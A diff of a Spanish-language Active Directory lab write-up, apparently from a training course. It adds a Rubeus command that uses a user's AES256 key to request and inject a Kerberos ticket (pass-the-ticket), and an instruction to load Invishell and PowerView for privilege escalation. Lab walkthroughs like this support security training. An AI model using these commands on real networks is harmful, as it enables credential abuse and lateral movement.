@@ -1171,9 +1171,11 @@ Obteniendo como respuesta *DCORP-DC* y *DCORP-APPSRV*
 Esto nos servirá para poder elevar privilegios, pero antes para poder elevarlos será necesario tener un usuario Administrador de la maquina que vamos a querer elevar privilegios.
 Tenemos secrets de *appadmin, srvadmin y websvc* vamos a comprobar si alguno de ellos tiene privilegios de administrador en *appadmin*
 ```shell
-
+[student97 - PSAdmin]
+C:\AD\Tools\Rubeus.exe asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
+EN el nuevo proceso que se nos ejecuta deberemos de cargar una *Invishell* y también cargar *PowerView*
 
 
 
